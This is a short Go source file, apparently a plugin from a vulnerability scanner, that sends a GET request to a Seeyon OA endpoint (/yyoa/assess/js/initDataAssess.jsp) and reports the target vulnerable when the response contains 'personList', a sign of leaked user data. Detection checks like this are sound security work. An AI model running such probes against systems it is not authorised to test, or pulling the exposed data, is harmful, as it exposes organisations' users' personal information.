package seeyon

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
	"strings"
)

//initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string) bool {
	if req, err := utils.HttpRequset(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "personList") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon InitDataAssess|%s\n", u+"/yyoa/assess/js/initDataAssess.jsp"))

			return true
		}
	}
	return false
}
